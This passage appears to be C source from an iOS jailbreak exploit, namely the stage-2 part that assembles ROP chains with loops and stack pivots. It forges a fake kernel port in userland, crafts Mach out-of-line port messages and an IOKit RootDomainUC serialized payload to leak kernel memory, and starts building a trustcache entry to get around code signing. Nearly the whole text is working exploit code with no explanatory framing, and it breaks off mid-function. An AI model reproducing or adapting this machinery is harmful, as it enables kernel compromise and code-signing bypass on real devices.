#include "common.h"
#include "rop.h"
#include "stage2.h"
#include "stage1.h"
#include <mach/mach.h>
#include <aio.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/sysctl.h>

#include <shared/iokit.h>
#include <shared/realsym.h>

// TODO: move those struct definitions into a new file

typedef struct {
	mach_msg_header_t head;
	mach_msg_body_t msgh_body;
	mach_msg_ool_ports_descriptor_t desc[1];
	char pad[4096]; // FIXME: what a waste
} ool_message_struct;

#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    uint32_t selector;
    mach_msg_type_number_t scalar_inputCnt;
    /*io_user_scalar_t scalar_input[16];*/
    mach_msg_type_number_t inband_inputCnt;
    char inband_input[24];
    mach_vm_address_t ool_input;
    mach_vm_size_t ool_input_size;
    mach_msg_type_number_t inband_outputCnt;
    mach_msg_type_number_t scalar_outputCnt;
    mach_vm_address_t ool_output;
    mach_vm_size_t ool_output_size;
} MEMLEAK_Request __attribute__((unused));
typedef struct {
    mach_msg_header_t Head;
    NDR_record_t NDR;
    kern_return_t RetCode;
    mach_msg_type_number_t inband_outputCnt;
    char inband_output[24];
    mach_msg_type_number_t scalar_outputCnt;
    /*io_user_scalar_t scalar_output[16];*/
    mach_vm_size_t ool_output_size;
    mach_msg_trailer_t trailer;
} MEMLEAK_Reply __attribute__((unused));
#pragma pack()

union {
    MEMLEAK_Request In;
    MEMLEAK_Reply Out;
} MEMLEAK_msg;

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_NONE 0
#define IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25
#define NENT 1


// TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
	while (ropvars != NULL) {
		if (!strcmp(name,ropvars->name) && strlen(name) == strlen(ropvars->name)) {
			return ropvars->stage_addr;
		}
		ropvars = ropvars->next;
	}
	LOG("Stage 2 ROP VAR %s not found",name);
	exit(-1);
}
void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t buf;
	int offset_delta = 0;
	uint64_t chain_pos = 0;
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				buf = next->value;
				// we add and then subtract cause otherwise this could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base + offset_delta;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case REL_OFFSET:
				buf = next->value + chain_pos + offsets->stage2_base;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case STATIC:
				buf = next->value;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case BUF:
				write(fd,(void*)next->value,next->second_val);
				offset_delta += next->second_val;
				chain_pos += next->second_val;
				break;
			case BARRIER:
				if (chain_pos > next->value) {
					LOG("not enought space to place barrier");
					exit(1);
				}
				uint64_t diff = next->value - chain_pos - offsets->stage2_base;
				chain_pos += diff;
				offset_delta += diff;
				char * tmp = malloc(diff);
				write(fd,tmp,diff);
				free(tmp);
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				write(fd,&buf,8);
				chain_pos += 8;
				break;
			case ROP_LOOP_START:
				{
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain
				int chain_per_break = 0;
				int chain_for_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8;
						chain_for_loop_end = chain_per_break*2; // we have to calls for end
						chain_per_break += 36*8; // add the if monster below
				}
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_for_loop_end;break;}
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;}
					if (lookahead_gadget->type == ROP_LOOP_START) {LOG("inner loops aren't supported atm");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				if (lookahead_gadget == NULL) {LOG("Loop start without an end!");exit(1);}

				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;
				uint64_t chain_start = chain_pos + offsets->stage2_base;
				uint64_t chain_start_in_file = chain_pos;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = chain_pos;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						
						// mmap the file back over the loop
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						ADD_COMMENT("restore the loop stack");
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED | MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
						
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8)/*the call below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else {lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				continue; // we have to handle the current gadget again, cause we overwrote it
				}
				break;
			case ROP_LOOP_BREAK:
				LOG("ROP_LOOP_BREAK OUTSIDE OF A LOOP");
				exit(1);
				break;
			case ROP_LOOP_END:
				break;
			default:
				buf = 0;
				write(fd,&buf,8);
				chain_pos += 8;
		}
		prev_gadget = next;
		next = next->next;
	}
	offsets->stage2_size = chain_pos + 0x1000;
}
uint64_t get_addr_from_name(offset_struct_t * offsets, char * name) {
	uint64_t sym = (uint64_t)dlsym(RTLD_DEFAULT,name);
	if (sym == 0) {LOG("symbol (%s) not found",name);exit(1);}
	uint64_t cache_addr = 0;
	syscall(294, &cache_addr);
	sym += 0x180000000;
	sym -= cache_addr;
	return sym;
}
char * pos_description_DBG(int pos, int longjmp_buf) {
	char * buf = malloc(100);
	memset(buf,0,100);
	if (longjmp_buf) {
		if (pos == 13) {
			snprintf(buf,100,"stack pivots here");
		}
		return buf;
	} 
	if (pos >= 5 && pos <= 13) {
		int arg = pos-4;
		if (arg == 6) {arg = 7;}
		else if (arg == 7) {arg = 6;}
		snprintf(buf,100,"ARG %d",arg);
	}
	return buf;
} 
void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
	rop_gadget_t * next = offsets->stage2_ropchain;	
	rop_gadget_t * prev_gadget;
	uint64_t current_addr = offsets->stage2_base;
	uint64_t buf;
	int offset_delta = 0;
	int longjmp_buf = 1;
	int pos = 0;
	char * pos_buf = NULL;
	LOG("STAGE 2 DBG\nWe start with our chain here, x0 is pointing to that location (%llx) and we are in longjmp atm",offsets->stage2_base);
	while (next != NULL) {
		switch (next->type) {
			case CODEADDR:
				buf = next->value;
				// we add and then we subtract otherwise it could underflow
				buf += offsets->new_cache_addr;
				buf -= 0x180000000;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (code address org:%llx) ",buf,next->value);
				if (next->value == offsets->BEAST_GADGET) {
					printf("Beast gadget (x30)\n");
					printf("=\n");
					pos = 0;
				}else if (next->value == offsets->BEAST_GADGET_LOADER) {
					printf("Beast gadget loader (x30)\n");
				}else if (next->value == offsets->str_x0_gadget) {
					printf("return val (x0) storing gadget (ARG 8) is the address where we will store to\n");
				}else if (next->value == offsets->memcpy) {
					printf("memcpy\n");
				}else{
					printf("normal call if you want to know what this is you have to check your offset struct\n");
				}
				current_addr += 8;
				break;
			case OFFSET:
				buf = (uint64_t)next->value + (uint64_t)offsets->stage2_base+ offset_delta;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case REL_OFFSET:
				buf = next->value + current_addr;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case STATIC:
				buf = next->value;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (static) %s\n",buf,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case BUF:
				offset_delta += next->second_val;
				current_addr += next->second_val;
				printf("BUFFER INSERTED HERE size: 0x%x spans to 0x%llx\n",next->second_val,current_addr);
				longjmp_buf = 0;
				pos = 0;
				break;
			case BARRIER:
				if (current_addr > next->value) {
					printf("not enought space to place barrier\n");
					exit(1);
				}
				uint64_t diff = next->value - current_addr;
				current_addr += diff;
				offset_delta += diff;
				printf("ADDED BARRIER HERE size: 0x%llx spans to 0x%llx\n",diff,current_addr);
				break;
			case ROP_VAR:
				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
				pos_buf = pos_description_DBG(pos,longjmp_buf);
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (variable) (%s realaddr: %llx) %s\n",buf,(char*)next->value,buf-next->second_val,pos_buf);
				free(pos_buf);
				current_addr += 8;
				pos++;
				break;
			case ROP_LOOP_START:
				{
				char * loop_buf_name = (char*)next->value;
				// get the length we need from one ROP_LOOP_BREAK in the chain
				int chain_per_break = 0;
				int chain_loop_end = 0;
				{
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = 0;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
						chain_per_break = ropchain_len * 8;
						chain_loop_end = chain_per_break*2; // two calls for end
						chain_per_break += 36*8; // add the if monster chain from below
				}
				int loop_size = 0;
				rop_gadget_t * lookahead_gadget = next->next;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_loop_end; break;}
					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
					else {loop_size += 8;}
					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
					lookahead_gadget = lookahead_gadget->next;
				}
				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}

				rop_gadget_t * bck_next = next->next;
				free(next);
				prev_gadget->next = bck_next;
				next = bck_next;
				uint64_t chain_start = current_addr;
				uint64_t chain_start_in_file = current_addr-offsets->stage2_base;

				// replace all the ROP_LOOP_BREAK gadgets with the chain
				lookahead_gadget = next;
				uint64_t lookahead_pos = (current_addr-offsets->stage2_base)/8;
				while (lookahead_gadget != NULL) {
					if (lookahead_gadget->type == ROP_LOOP_END) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;
						
						
						ADD_COMMENT("restore the loop stack");
						int mmap_size = loop_size;
						if (mmap_size & 0x3fff) {mmap_size = (mmap_size & ~0x3fff) + 0x4000;}
						CALL_FUNC(get_addr_from_name(offsets,"__mmap"),(chain_start & ~0x3fff),mmap_size,PROT_READ | PROT_WRITE,MAP_FIXED|MAP_FILE,STAGE2_FD,(chain_start_in_file & ~0x3fff),0,0);
						
						ADD_COMMENT("stack pivot mov sp,x2");
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start,0,0,0,0,0);
						
						curr_gadget->next = bck_next;
						break;
					} else if (lookahead_gadget->type == ROP_LOOP_BREAK) {
						// setup rop chain generator
						rop_gadget_t * prev = NULL;
						rop_gadget_t * curr_gadget = lookahead_gadget;
						bck_next = lookahead_gadget->next;
						curr_gadget->next = NULL;
						curr_gadget->type = NONE;
						curr_gadget->comment = NULL;
						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
						int rop_var_tmp_nr = 0;
						int rop_var_arg_num = -1;

						/* TLDR on what that monster does:
						 * jumps to the cbz_x0_gadget which will then jump to the str_x0_x19 gadget if x0 isn't set.
						 * if it's nonezero, the str_x0_x19 gadget will misalign the stack by 4
						 * after that we use the beast gadget again to load the vars, but because of stack misalignment we can now do two different things
						 * if we are zero we call the stack pivot from longjump to get us passed the two calls (free/pivot)
						 * if we are nonezero we basically do nothing and because of that run into the free and pivot calls
						 */
					    ADD_GADGET(); 
						ADD_GADGET(); 
						ADD_GADGET(); /* d9 */ 
						ADD_GADGET(); /* d8 */ 
						ADD_GADGET(); /* x28 */
						ADD_CODE_GADGET(offsets->cbz_x0_gadget); /* x27 */ 
						ADD_GADGET(); /* x26 */ 
						ADD_GADGET(); /* x25 */
						ADD_GADGET(); /* x24 */
						ADD_GADGET(); /* x23 */
						ADD_GADGET(); /* x22 */
						ADD_GADGET(); /* x21 */
						ADD_GADGET(); /* x20 */
						ADD_REL_OFFSET_GADGET(-offsets->str_x0_gadget_offset); /* x19 pointing to itself, cause we will use the str x0 gadget as a regloader so we have to make sure we store somewhere save */ 
						ADD_GADGET(); /* x29 */ 
						ADD_CODE_GADGET(offsets->BEAST_GADGET_CALL_ONLY); /* x30 */ 	
					    ADD_GADGET(); /* x19 (if nonezero) */ 
					    ADD_GADGET(); /* x20 (if nonezero) */
					    ADD_GADGET(); /* x29 (if nonezero) d9 (if zero) */ 
					    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (if nonzero) d8 (if zero) */
					    ADD_GADGET(); /* x28 (if zero) */ 
					    ADD_CODE_GADGET(offsets->stack_pivot); /* x27 (if zero) */ 
						ADD_GADGET(); /* d9  (not 0) x26 (0) */
						ADD_GADGET(); /* d8  (not 0) x25 (0) */
						ADD_REL_OFFSET_GADGET(96/*our own chain*/+(chain_per_break-36*8) /*the call below*/); /* x28 (not 0) x24 (0) */
					    ADD_GADGET(); /* x27 (not 0) x23 (0) */
					    ADD_GADGET(); /* x26 (not 0) x22 (0) */
					    ADD_GADGET(); /* x25 (not 0) x21 (0) */
					    ADD_GADGET(); /* x24 (not 0) x20 (0) */
					    ADD_GADGET(); /* x23 (not 0) x19 (0) */
					    ADD_GADGET(); /* x22 (not 0) x29 (0) */
					    ADD_CODE_GADGET(offsets->BEAST_GADGET); /* x21 (not 0) x30 (0) */
					    ADD_GADGET(); /* x20 (not 0) */
					    ADD_GADGET(); /* x19 (not 0) */
						ADD_GADGET(); /* x29 (not 0) */
						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */

						
						ADD_COMMENT("stack pivot mov sp,x2");
						// pivot the stack to where we want it
						CALL_FUNC(offsets->stack_pivot,0,0,chain_start+loop_size,0,0,0,0,0);
						curr_gadget->next = bck_next;
					}else{lookahead_pos += 8;}
					lookahead_gadget = lookahead_gadget->next;
				}

				printf("ADDED LOOP WITH SIZE %d starting at 0x%llx\n",loop_size,chain_start);
				continue; // we have to handle the current gadget again, cause we overwrote it
				}
			case ROP_LOOP_BREAK:
				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
				exit(1);
				break;
			case ROP_LOOP_END:
				break;
			default:
				buf = 0;
				printf("0x%.8llx: ",current_addr);
				printf("0x%.8llx (NOP)\n",buf);
				pos++;
				current_addr += 8;
				break;
		}
		if (next->comment != NULL) {
			printf("COMMENT(line: %llu): ",next->comment->line);
			puts(next->comment->comment);
		}
		prev_gadget = next;
		next = next->next;
	}
	printf("===\n");
}
void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
	void * buf_pointer = offsets->stage2_databuffer;
	uint64_t buf_in_stage = offsets->stage2_base;
	uint32_t buffer_size = 0;
	buf_in_stage += 22*8; // jump over the longjmp we have at the start of the buffer
	rop_var_t * current_var = ropvars;
	while (current_var != NULL) {
		uint64_t real_size = current_var->size;
		if (current_var->size < 8) {// there is a problem where the rop framework can only work on 64 bit values FIXME 
			current_var->size = 8;
		} 
		buffer_size += current_var->size;
		if (buffer_size > offsets->stage2_databuffer_len) {
			LOG("STAGE 3, DATABUFFER TO SMALL");
			exit(-1);
		}
		// copy the variable into the buffer
		memcpy(buf_pointer,current_var->buffer,real_size);
		current_var->stage_addr = buf_in_stage;
		buf_pointer += current_var->size;
		buf_in_stage += current_var->size;
		current_var = current_var->next;
	}
}

// TODO: remove the test code
void stage2(offset_struct_t * offsets,char * base_dir) {

	// TODO: the stage2_databuffer_len should be set in install.m
	offsets->stage2_databuffer_len = 0x10000;
	offsets->stage2_databuffer = malloc(offsets->stage2_databuffer_len);

	// let's go
	INIT_FRAMEWORK(offsets);
/*	
	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	uint64_t * test = malloc(sizeof(uint64_t));
	*test = 10;
	DEFINE_ROP_VAR("test",8,test);
	SET_ROP_VAR64("test",14);
	DEFINE_ROP_VAR("test2",8,test);
	ROP_VAR_CPY("test","test2",8);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	ADD_COMMENT("var/arg test");
	ROP_VAR_ARG("test",1);
	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
	*/

#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
	ADD_COMMENT(name); \
	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);

	char * buf[1024];
	snprintf((char*)&buf,sizeof(buf),"testing...");
	DEFINE_ROP_VAR("test_string",sizeof(buf),buf);

#if 0


	DEFINE_ROP_VAR("swapprefix_buffer",1024,&buf);
	DEFINE_ROP_VAR("swapprefix_length",sizeof(uint64_t),&buf);
	SET_ROP_VAR64("swapprefix_length",0);
	// using undocumented magic to get the integer name of vm.swapfileprefix
	char * name = "vm.swapfileprefix";
	int name2oid[2];
	name2oid[0] = 0;
	name2oid[1] = 3;
	int * real_oid = malloc(CTL_MAXNAME+2);
	size_t oidlen = CTL_MAXNAME+2;
	if (sysctl(name2oid,2,real_oid,&oidlen,name,strlen(name)) != 0) {LOG("OHNO");}
	DEFINE_ROP_VAR("swapprefix_oid",oidlen,real_oid);
	ROP_VAR_ARG_HOW_MANY(3);
	ROP_VAR_ARG("swapprefix_oid",1);
	ROP_VAR_ARG("swapprefix_buffer",3);
	ROP_VAR_ARG("swapprefix_length",4);
	CALL("sysctl",0,oidlen/4,0,0,0,0,0,0);




	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);

	DEFINE_ROP_VAR("a",8,&buf);
	DEFINE_ROP_VAR("b",8,&buf);
	ROP_VAR_ADD("a","a","b");

	/*
	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
	memset(myaction,0,sizeof(struct __sigaction));
	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
	myaction->sa_tramp = get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr; //offsets->longjmp-0x180000000+offsets->new_cache_addr;
	myaction->sa_mask = (1 << (SIGWINCH-1));
	DEFINE_ROP_VAR("my_action",sizeof(struct __sigaction),myaction);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("my_action",2);
	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
*/
	uint64_t * test_break_val = malloc(8);
	*test_break_val = 0;
	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
	ADD_LOOP_START("test_loop")
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("test_string",2);
		CALL("write",1,0,1024,0,0,0,0,0);
		
		/*	
	 	ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG64("reply_port",5); 
		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0, 0, MACH_PORT_NULL,0);
		*/

		// set x0 to the_one
		SET_X0_FROM_ROP_VAR("test_break_val");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
	ADD_LOOP_END();
#else

	
	// SETUP VARS
	// TODO: replace tmp with NULL and let the framework handle it
	char * tmp = malloc(0x1000);
	memset(tmp,0,0x1000);
	DEFINE_ROP_VAR("should_race",sizeof(uint64_t),tmp); //
	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
	DEFINE_ROP_VAR("desc_addr",8,tmp); // pointer to the port buffer

	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
	memset(ool_message,0,sizeof(ool_message_struct));
	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    ool_message->head.msgh_local_port = MACH_PORT_NULL;
    ool_message->head.msgh_size = (unsigned int)sizeof(ool_message_struct) - 2048;
    ool_message->msgh_body.msgh_descriptor_count = 1;
    ool_message->desc[0].count = 1; // will still go to kalloc.16 but we don't have another point of failture
    ool_message->desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_message->desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;

	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel

	SET_ROP_VAR64_TO_VAR_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc[0].address),"tmp_port",0);


	kport_t * fakeport = malloc(sizeof(kport_t));
	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
	fakeport->ip_references = 100;
	fakeport->ip_lock.type = 0x11;
	fakeport->ip_messages.port.receiver_name = 1;
	fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
	fakeport->ip_srights = 99;

	DEFINE_ROP_VAR("fakeport",sizeof(kport_t),fakeport); // the userland port

	DEFINE_ROP_VAR("service",sizeof(io_service_t),tmp); // RootDomain Service
	DEFINE_ROP_VAR("client",sizeof(io_connect_t),tmp); // RootDomainUC

	uint32_t raw_dict[] = {
		kOSSerializeMagic,
		kOSSerializeEndCollection | kOSSerializeData | 0x10,
		0xaaaaaaaa,
		0xbbbbbbbb,
		0x00000000,
		0x00000000,
	};


	MEMLEAK_Request * memleak_msg = malloc(sizeof(MEMLEAK_msg));
	memleak_msg->NDR = NDR_record;
	memleak_msg->selector = 7;
	memleak_msg->scalar_inputCnt = 0;
	memleak_msg->inband_inputCnt = 24; /*sizeof raw_dict*/
	memcpy(&memleak_msg->inband_input,&raw_dict,24);
	memleak_msg->ool_input_size = 0;
	memleak_msg->ool_input = (mach_vm_address_t)NULL;
	memleak_msg->inband_outputCnt = 0;
	memleak_msg->scalar_outputCnt = 0;
	memleak_msg->ool_output = 0;
	memleak_msg->ool_output_size = 0;
	memleak_msg->Head.msgh_bits = MACH_MSGH_BITS(19,MACH_MSG_TYPE_MAKE_SEND_ONCE);
	memleak_msg->Head.msgh_id = 2865;
	memleak_msg->Head.msgh_reserved = 0;


	DEFINE_ROP_VAR("memleak_msg",sizeof(MEMLEAK_msg),memleak_msg);
	SET_ROP_VAR64_TO_VAR_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,inband_input) + 2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport

	DEFINE_ROP_VAR("self",sizeof(mach_port_t),tmp);



	// setup new trustcache struct
	// TODO: move that into a seperate file
	typedef char hash_t[20];
	struct trust_chain {
		uint64_t next;
		unsigned char uuid[16];
		unsigned int count;
		hash_t hash[1];
	};
	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
